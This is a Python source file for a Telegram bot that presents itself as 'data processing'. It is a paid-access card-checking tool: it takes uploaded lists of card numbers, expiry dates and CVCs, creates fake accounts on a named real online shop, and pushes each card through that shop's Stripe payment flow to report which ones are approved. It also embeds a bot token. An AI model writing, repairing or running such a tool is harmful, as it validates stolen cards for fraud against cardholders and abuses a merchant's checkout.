# ============================================================
#  Telegram Bot — Data Processing Interface
#  Made by TalkNeon
# ============================================================

import os
import sys
import re
import time
import random
import json
import uuid
import string
import threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from datetime import datetime

try:
    import brotli
except ImportError:
    brotli = None

try:
    from requests_toolbelt.multipart.encoder import MultipartEncoder
except ImportError:
    MultipartEncoder = None

# ============================================================
#  Configuration
# ============================================================
BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
DEVELOPER = "TalkNeon"
ADMIN_IDS = []  # Add your Telegram user IDs here

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
#  Persistence — Keys & Users
# ============================================================
def _load_json(path, default=None):
    if default is None:
        default = {}
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_keys():
    return _load_json(KEYS_FILE, {})


def save_keys(data):
    _save_json(KEYS_FILE, data)


def load_users():
    return _load_json(USERS_FILE, {})


def save_users(data):
    _save_json(USERS_FILE, data)


def generate_key():
    return "TN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))


def is_admin(user_id):
    return int(user_id) in ADMIN_IDS


def is_authorized(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    return str(user_id) in users


def authorize_user(user_id, key):
    users = load_users()
    users[str(user_id)] = {"key": key, "redeemed_at": time.time()}
    save_users(users)


# ============================================================
#  Telegram API helpers
# ============================================================
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg_request(method, **kwargs):
    try:
        r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30)
        return r.json()
    except Exception:
        return {}


def send_message(chat_id, text, parse_mode="HTML", reply_to=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    return tg_request("sendMessage", **params)


def edit_message(chat_id, message_id, text, parse_mode="HTML"):
    return tg_request("editMessageText",
                      chat_id=chat_id,
                      message_id=message_id,
                      text=text,
                      parse_mode=parse_mode)


def get_file_url(file_id):
    resp = tg_request("getFile", file_id=file_id)
    if resp.get("ok"):
        path = resp["result"]["file_path"]
        return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    return None


def download_file(file_id):
    url = get_file_url(file_id)
    if not url:
        return None
    try:
        r = requests.get(url, timeout=30)
        return r.text
    except Exception:
        return None


# ============================================================
#  Processing engine (untouched logic from original script)
# ============================================================
def setup_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    ua = UserAgent()
    session.headers.update({
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    })
    return session


def generate_email():
    return f"user{random.randint(1000,9999)}@gmail.com"


def generate_password():
    return f"fifa24Iok#{random.randint(1000,9999)}"


def get_script_data(page_soup):
    script_tag = page_soup.find("script", string=re.compile(r"var wcpay_upe_config"))
    if not script_tag:
        script_tag = page_soup.find("script", string=re.compile(r"wcpay"))
    if not script_tag:
        scripts = page_soup.find_all("script")
        for script in scripts:
            if script.string and "createSetupIntentNonce" in script.string:
                script_tag = script
                break
    if not script_tag or not script_tag.string:
        return None, None, None
    content = script_tag.string
    nonce_match = re.search(r'"createSetupIntentNonce":"([^"]+)"', content)
    key_match = re.search(r'"publishableKey":"([^"]+)"', content)
    acc_id_match = re.search(r'"accountId":"([^"]+)"', content)
    nonce = nonce_match.group(1) if nonce_match else None
    key = key_match.group(1) if key_match else None
    acc_id = acc_id_match.group(1) if acc_id_match else ""
    return nonce, key, acc_id


def check_card(card_data, session, ua):
    n, mm, yy, cvc = card_data
    try:
        mail = generate_email()
        password = generate_password()

        reg_page = session.get("https://meddentalstuff.com/my-account/", timeout=15)
        reg_page.raise_for_status()
        soup = BeautifulSoup(reg_page.text, "html.parser")
        register_nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
        if not register_nonce_tag:
            return "FAIL", "Could not find registration nonce"
        register_nonce = register_nonce_tag["value"]

        reg_data = {
            "email": mail,
            "password": password,
            "woocommerce-register-nonce": register_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
            "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }

        reg_response = session.post("https://meddentalstuff.com/my-account/", data=reg_data, timeout=15)
        reg_response.raise_for_status()
        if reg_response.url == "https://meddentalstuff.com/my-account/":
            soup_err = BeautifulSoup(reg_response.text, "html.parser")
            err_msg = soup_err.find("ul", class_="woocommerce-error")
            if err_msg:
                return "FAIL", f"Registration failed: {err_msg.get_text(strip=True)}"

        payment_page = session.get("https://meddentalstuff.com/my-account/add-payment-method/", timeout=15)
        payment_page.raise_for_status()
        payment_soup = BeautifulSoup(payment_page.text, "html.parser")

        nonce, key, acc_id = get_script_data(payment_soup)
        if not nonce or not key:
            return "FAIL", "Could not extract configuration"

        stripe_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": ua.random,
        }
        sessionid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        stripe_data = (
            f"billing_details[name]=+&billing_details[email]={mail}"
            f"&billing_details[address][country]=US&billing_details[address][postal_code]=91711"
            f"&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F2dcfccda05%3B+stripe-js-v3%2F2dcfccda05%3B+payment-element%3B+deferred-intent"
            f"&referrer=https%3A%2F%2Fmeddentalstuff.com&time_on_page=44602"
            f"&client_attribution_metadata[client_session_id]={sessionid}"
            f"&client_attribution_metadata[merchant_integration_source]=elements"
            f"&client_attribution_metadata[merchant_integration_subtype]=payment-element"
            f"&client_attribution_metadata[merchant_integration_version]=2021"
            f"&client_attribution_metadata[payment_intent_creation_flow]=deferred"
            f"&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
            f"&client_attribution_metadata[elements_session_config_id]=8f2dd842-031b-4412-bcc5-bb7b38fb7f1b"
            f"&guid={guid}&muid={muid}&sid={sid}&key={key}&_stripe_account={acc_id}"
        )

        stripe_resp = session.post("https://api.stripe.com/v1/payment_methods",
                                   headers=stripe_headers, data=stripe_data, timeout=15)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get("id")
        if not pm_id:
            error_msg = stripe_json.get("error", {}).get("message", "Unknown error")
            return "DECLINED", error_msg

        if not MultipartEncoder:
            return "FAIL", "requests_toolbelt not installed"

        multipart_data = MultipartEncoder({
            "action": "create_setup_intent",
            "wcpay-payment-method": pm_id,
            "_ajax_nonce": nonce,
        })
        ajax_headers = {
            "authority": "meddentalstuff.com",
            "accept": "*/*",
            "content-type": multipart_data.content_type,
            "origin": "https://meddentalstuff.com",
            "referer": "https://meddentalstuff.com/my-account/add-payment-method/",
            "user-agent": ua.random,
        }
        ajax_resp = session.post("https://meddentalstuff.com/wp-admin/admin-ajax.php",
                                 headers=ajax_headers, data=multipart_data, timeout=15)
        ajax_resp.raise_for_status()

        content_encoding = ajax_resp.headers.get("Content-Encoding", "")
        if content_encoding == "br" and brotli:
            content = brotli.decompress(ajax_resp.content).decode("utf-8")
        else:
            content = ajax_resp.text

        if '"success":true' in content or '"success":True' in content:
            return "APPROVED", None
        else:
            match = re.search(r'"message"\s*:\s*"([^"]+)"', content)
            msg = match.group(1) if match else "Unknown error"
            return "DECLINED", msg

    except requests.exceptions.RequestException as e:
        return "ERROR", f"Network error: {str(e)}"
    except Exception as e:
        return "ERROR", f"Unexpected error: {str(e)}"


# ============================================================
#  Processing runner with live progress callback
# ============================================================
def run_processing(lines, on_progress=None, on_complete=None):
    """Process entries and call on_progress / on_complete callbacks."""
    session = setup_session()
    ua = UserAgent()

    total = len(lines)
    results = {"approved": 0, "declined": 0, "errors": 0, "total": total, "approved_list": []}

    for idx, line in enumerate(lines, 1):
        parts = line.split("|")
        if len(parts) < 4:
            results["errors"] += 1
            if on_progress:
                on_progress(idx, total, results, line.strip(), "INVALID", "Bad format")
            continue

        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()

        if mm not in ["10", "11", "12"] and len(mm) == 1:
            mm = f"0{mm}"
        if not yy.startswith("20") and len(yy) == 2:
            yy = f"20{yy}"

        status, msg = check_card((n, mm, yy, cvc), session, ua)

        entry = f"{n}|{mm}|{yy}|{cvc}"
        if status == "APPROVED":
            results["approved"] += 1
            results["approved_list"].append(entry)
        elif status == "DECLINED":
            results["declined"] += 1
        else:
            results["errors"] += 1

        if on_progress:
            on_progress(idx, total, results, entry, status, msg)

        time.sleep(random.uniform(0.5, 1.5))

    session.close()

    if on_complete:
        on_complete(results)

    return results


# ============================================================
#  Bot message formatters
# ============================================================
FOOTER = f"\n{'─' * 28}\n  Made by {DEVELOPER}"


def fmt_start():
    return (
        "<b>Data Processing Bot</b>\n"
        f"{'─' * 28}\n\n"
        "Upload a <b>.txt</b> file, then reply to it with <b>/run</b>\n\n"
        "<b>Commands:</b>\n"
        "  /start    — Show this menu\n"
        "  /redeem   — Unlock access\n"
        "  /run      — Process uploaded file\n"
        "  /lookup   — Lookup (coming soon)\n\n"
        "<b>How to use:</b>\n"
        "  1. Send a .txt file\n"
        "  2. Reply to the file with /run\n"
        "  3. Wait for results\n"
        f"{FOOTER}"
    )


def fmt_unauthorized():
    return (
        "<b>Access Denied</b>\n\n"
        "You need to redeem a key first.\n"
        "Use: <code>/redeem YOUR-KEY</code>\n"
        f"{FOOTER}"
    )


def fmt_progress(idx, total, results, entry, status, msg):
    pct = int((idx / total) * 100)
    bar_len = 20
    filled = int(bar_len * idx / total)
    bar = "█" * filled + "░" * (bar_len - filled)

    status_icon = {"APPROVED": "✓", "DECLINED": "✗", "ERROR": "!", "FAIL": "!", "INVALID": "?"}
    icon = status_icon.get(status, "·")

    text = (
        f"<b>Processing</b>  [{idx}/{total}]\n"
        f"<code>{bar}</code>  {pct}%\n\n"
        f"<b>Current:</b> <code>{entry[:20]}...</code>\n"
        f"<b>Status:</b>  {icon} {status}"
    )
    if msg:
        text += f" — {msg[:60]}"

    text += (
        f"\n\n<b>Results:</b>\n"
        f"  Approved:  {results['approved']}\n"
        f"  Declined:  {results['declined']}\n"
        f"  Errors:    {results['errors']}\n"
        f"{FOOTER}"
    )
    return text


def fmt_results(results):
    text = (
        f"<b>Processing Complete</b>\n"
        f"{'─' * 28}\n\n"
        f"  Total:     {results['total']}\n"
        f"  Approved:  {results['approved']}\n"
        f"  Declined:  {results['declined']}\n"
        f"  Errors:    {results['errors']}\n"
    )
    if results["approved_list"]:
        text += f"\n<b>Approved entries:</b>\n"
        for entry in results["approved_list"][:25]:
            text += f"  <code>{entry}</code>\n"
        if len(results["approved_list"]) > 25:
            text += f"  ... and {len(results['approved_list']) - 25} more\n"

    text += FOOTER
    return text


# ============================================================
#  Active processing tracker (one per user)
# ============================================================
active_users = set()
active_lock = threading.Lock()


# ============================================================
#  Command handlers
# ============================================================
def handle_update(update):
    msg = update.get("message")
    if not msg:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    text = (msg.get("text") or "").strip()

    # --- /start ---
    if text == "/start":
        send_message(chat_id, fmt_start())
        return

    # --- /lookup ---
    if text == "/lookup":
        send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
        return

    # --- /genkey (admin) ---
    if text.startswith("/genkey"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>{FOOTER}")
            return
        key = generate_key()
        keys = load_keys()
        keys[key] = {"created_by": user_id, "created_at": time.time(), "used": False}
        save_keys(keys)
        send_message(chat_id, f"<b>Key Generated</b>\n\n<code>{key}</code>{FOOTER}")
        return

    # --- /redeem ---
    if text.startswith("/redeem"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, "<b>Usage:</b> <code>/redeem YOUR-KEY</code>" + FOOTER)
            return
        key = parts[1].strip()
        keys = load_keys()
        if key not in keys:
            send_message(chat_id, "<b>Invalid key.</b>" + FOOTER)
            return
        if keys[key].get("used"):
            send_message(chat_id, "<b>Key already used.</b>" + FOOTER)
            return
        keys[key]["used"] = True
        keys[key]["used_by"] = user_id
        save_keys(keys)
        authorize_user(user_id, key)
        send_message(chat_id, f"<b>Access Granted</b>\n\nWelcome aboard.{FOOTER}")
        return

    # --- /run ---
    if text == "/run":
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        reply = msg.get("reply_to_message")
        if not reply or not reply.get("document"):
            send_message(chat_id, "<b>Reply to a .txt file with /run</b>" + FOOTER)
            return

        doc = reply["document"]
        fname = doc.get("file_name", "")
        if not fname.lower().endswith(".txt"):
            send_message(chat_id, "<b>Only .txt files are accepted.</b>" + FOOTER)
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, "<b>You already have a task running.</b>" + FOOTER)
                return
            active_users.add(user_id)

        # Download file
        content = download_file(doc["file_id"])
        if not content:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
            return

        lines = [l.strip() for l in content.splitlines() if l.strip()]
        if not lines:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
            return

        # Send initial progress message
        init_resp = send_message(chat_id,
            f"<b>Starting</b>\n\nEntries: {len(lines)}\nPlease wait..."
            + FOOTER)
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        # Run processing in a thread
        def _run():
            last_edit = [0]

            def on_progress(idx, total, results, entry, status, detail):
                now = time.time()
                # Edit at most every 3 seconds to avoid rate limits
                if now - last_edit[0] < 3 and idx < total:
                    return
                last_edit[0] = now
                if progress_msg_id:
                    edit_message(chat_id, progress_msg_id,
                                 fmt_progress(idx, total, results, entry, status, detail))

            def on_complete(results):
                send_message(chat_id, fmt_results(results))
                with active_lock:
                    active_users.discard(user_id)

            try:
                run_processing(lines, on_progress=on_progress, on_complete=on_complete)
            except Exception as e:
                send_message(chat_id, f"<b>Processing error:</b> {str(e)[:200}" + FOOTER)
                with active_lock:
                    active_users.discard(user_id)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return

    # Ignore other messages silently


# ============================================================
#  Polling loop
# ============================================================
def main():
    print(f"[Bot] Starting — Made by {DEVELOPER}")
    print(f"[Bot] Polling for updates...")

    offset = 0
    while True:
        try:
            resp = tg_request("getUpdates", offset=offset, timeout=30)
            updates = resp.get("result", [])
            for upd in updates:
                offset = upd["update_id"] + 1
                try:
                    handle_update(upd)
                except Exception as e:
                    print(f"[Bot] Error handling update: {e}")
        except KeyboardInterrupt:
            print("\n[Bot] Stopped.")
            break
        except Exception as e:
            print(f"[Bot] Polling error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
